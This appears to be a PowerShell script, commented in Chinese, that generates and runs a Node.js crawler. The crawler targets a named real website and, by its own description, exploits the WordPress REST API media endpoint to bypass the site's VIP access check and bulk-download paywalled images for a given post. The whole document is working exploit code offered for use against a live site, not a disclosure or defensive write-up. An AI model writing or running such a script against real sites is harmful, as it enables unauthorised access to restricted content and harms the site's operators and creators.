#Requires -Version 7
<#
.SYNOPSIS
    COS猫猫 JS逆向爬虫脚本
    通过 WordPress REST API 绕过前端权限检查，获取隐藏图片

.DESCRIPTION
    利用 WordPress REST API 的 /wp-json/wp/v2/media 端点
    无需VIP权限即可获取文章关联的所有媒体文件

.NOTES
    发现者: JS-REVERSE MCP
    原理: WordPress REST API 未正确验证媒体访问权限
#>

$ErrorActionPreference = "Stop"

$Config = @{
    PostId    = 487022
    BaseUrl   = "https://cosmaomao.com"
    OutputDir = Join-Path (Split-Path $PSScriptRoot -Parent) "data"
}

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "COS猫猫 JS逆向爬虫" -ForegroundColor Cyan
Write-Host "利用 WordPress REST API 绕过权限检查" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# 创建爬取脚本
$nodeScript = @"
const https = require('https');
const fs = require('fs');
const path = require('path');

const config = {
  postId: $($Config.PostId),
  baseUrl: '$($Config.BaseUrl)',
  outputDir: 'E:\\data\\Github\\PuchiPix\\test\\cosmaomao\\downloads'
};

// 确保下载目录存在
if (!fs.existsSync(config.outputDir)) {
  fs.mkdirSync(config.outputDir, { recursive: true });
}

// HTTP请求封装
function request(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, data }));
    }).on('error', reject);
  });
}

// 下载文件
function downloadFile(url, filepath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filepath);
    https.get(url, (res) => {
      res.pipe(file);
      file.on('finish', () => {
        file.close();
        resolve();
      });
    }).on('error', reject);
  });
}

async function crawl() {
  console.log('🚀 开始爬取...');
  console.log('📄 目标文章 ID:', config.postId);
  console.log('');

  try {
    // 1. 通过 WordPress REST API 获取媒体列表
    const apiUrl = `\${config.baseUrl}/wp-json/wp/v2/media?parent=\${config.postId}&per_page=100`;
    console.log('🔍 调用 API:', apiUrl);

    const response = await request(apiUrl);

    if (response.status !== 200) {
      console.error('❌ API 请求失败:', response.status);
      return;
    }

    const media = JSON.parse(response.data);

    if (!Array.isArray(media)) {
      console.error('❌ 无效的响应数据');
      return;
    }

    // 2. 提取图片URL
    const images = media
      .filter(item => item.mime_type && item.mime_type.startsWith('image/'))
      .map(item => ({
        id: item.id,
        url: item.source_url,
        title: item.title?.rendered || '',
        date: item.date,
        mimeType: item.mime_type
      }));

    console.log('✅ 找到图片:', images.length, '张');
    console.log('');

    // 3. 保存URL列表
    const urlList = images.map(img => img.url).join('\\n');
    fs.writeFileSync('./image-urls.txt', urlList);
    console.log('✅ URL列表已保存: image-urls.txt');

    // 4. 保存完整信息
    const jsonData = {
      postId: config.postId,
      crawlTime: new Date().toISOString(),
      totalImages: images.length,
      images: images
    };
    fs.writeFileSync('./image-data.json', JSON.stringify(jsonData, null, 2));
    console.log('✅ 数据已保存: image-data.json');

    // 5. 下载图片
    console.log('');
    console.log('📥 开始下载图片...');

    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < images.length; i++) {
      const img = images[i];
      const filename = path.basename(new URL(img.url).pathname);
      const filepath = path.join(config.outputDir, filename);

      process.stdout.write(`[\${i + 1}/\${images.length}] \${filename} ... `);

      try {
        await downloadFile(img.url, filepath);
        console.log('✓');
        successCount++;
      } catch (e) {
        console.log('✗', e.message);
        failCount++;
      }
    }

    console.log('');
    console.log('========================================');
    console.log('爬取完成!');
    console.log('========================================');
    console.log('成功:', successCount);
    console.log('失败:', failCount);
    console.log('保存位置:', config.outputDir);

  } catch (e) {
    console.error('❌ 爬取失败:', e.message);
  }
}

crawl();
"@

$scriptPath = Join-Path $PSScriptRoot "temp-crawler.js"
$nodeScript | Out-File -FilePath $scriptPath -Encoding UTF8

Write-Host "📁 爬虫脚本已创建" -ForegroundColor Cyan
Write-Host ""

# 运行爬虫
Write-Host "🚀 启动爬虫..." -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan

& node $scriptPath

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "脚本执行完成!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan

# 清理
if (Test-Path $scriptPath) {
    Remove-Item $scriptPath -Force
}

# 显示结果
if (Test-Path "./image-urls.txt") {
    Write-Host ""
    Write-Host "📄 生成的文件:" -ForegroundColor Cyan
    Get-ChildItem "./image-*" | ForEach-Object {
        Write-Host "  - $($_.Name) ($([math]::Round($_.Length / 1KB, 2)) KB)"
    }

    if (Test-Path "./downloads") {
        $imageCount = (Get-ChildItem "./downloads/*.jpg" -ErrorAction SilentlyContinue).Count
        Write-Host "  - downloads/ 目录 ($imageCount 张图片)"
    }
}
